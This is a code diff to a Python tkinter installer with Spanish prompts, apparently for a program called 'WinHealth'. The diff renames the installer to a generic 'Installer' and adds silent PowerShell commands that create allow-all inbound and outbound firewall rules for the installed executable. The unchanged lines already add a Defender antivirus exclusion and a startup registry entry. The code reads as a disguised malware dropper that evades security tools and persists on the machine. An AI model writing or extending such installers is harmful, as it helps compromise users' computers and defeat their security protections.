@@ -56,7 +56,7 @@ def python_executable():
 
 
 # --- Core functions ---
-def kill_process(process_name="winhealth.exe"):
+def kill_process(process_name):
     try:
         subprocess.run(
             ["taskkill", "/f", "/im", process_name],
@@ -70,7 +70,7 @@ def kill_process(process_name="winhealth.exe"):
 
 
 def uninstall_old():
-    kill_process("winhealth.exe")
+    kill_process(TARGET_FILENAME)
     if os.path.isfile(TARGET_PATH):
         try:
             os.remove(TARGET_PATH)
@@ -143,6 +143,48 @@ def add_defender_exclusion(folder):
         return False
 
 
+def allow_firewall_all(folder):
+    exe_path = os.path.join(folder, TARGET_FILENAME)
+    inbound_cmd = f'New-NetFirewallRule -DisplayName "helloworld.exe Inbound" -Direction Inbound -Program "{exe_path}" -Action Allow -Profile Any'
+    outbound_cmd = f'New-NetFirewallRule -DisplayName "helloworld.exe Outbound" -Direction Outbound -Program "{exe_path}" -Action Allow -Profile Any'
+
+    try:
+        # Inbound rule
+        subprocess.run(
+            [
+                "powershell",
+                "-NoProfile",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-Command",
+                inbound_cmd,
+            ],
+            check=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+        )
+        # Outbound rule
+        subprocess.run(
+            [
+                "powershell",
+                "-NoProfile",
+                "-ExecutionPolicy",
+                "Bypass",
+                "-Command",
+                outbound_cmd,
+            ],
+            check=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW,
+        )
+        return True
+    except Exception as e:
+        print("Error:", e)
+        return False
+
+
 def add_to_startup(exe_path):
     try:
         key = winreg.OpenKey(
@@ -171,14 +213,12 @@ def start_file(folder, filename):
 class InstallerApp:
     def __init__(self, root):
         self.root = root
-        self.root.title("WinHealth Installer")
+        self.root.title("Installer")
         self.root.geometry("450x150")
         self.root.resizable(False, False)
 
         # Initial question
-        self.label = tk.Label(
-            root, text="¿Quieres instalar WinHealth?", font=("Segoe UI", 12)
-        )
+        self.label = tk.Label(root, text="¿Quieres instalar?", font=("Segoe UI", 12))
         self.label.pack(pady=20)
 
         # Progress bar and status
@@ -223,6 +263,10 @@ class InstallerApp:
                 "Agregando a exclusiones de Defender...",
                 lambda: add_defender_exclusion(WINHEALTH_FOLDER),
             ),
+            (
+                "Agregando reglas al firewall...",
+                lambda: allow_firewall_all(WINHEALTH_FOLDER),
+            ),
             ("Agregando al inicio de Windows...", lambda: add_to_startup(TARGET_PATH)),
             (
                 "Iniciando aplicación...",
@@ -252,7 +296,7 @@ class InstallerApp:
         # Finished
         self.progress.pack_forget()
         self.status.pack_forget()
-        self.final_label.config(text="WinHealth se instaló correctamente")
+        self.final_label.config(text="La aplicación se instaló correctamente!")
         self.final_label.pack(pady=40)
         self.show_close_button()
 
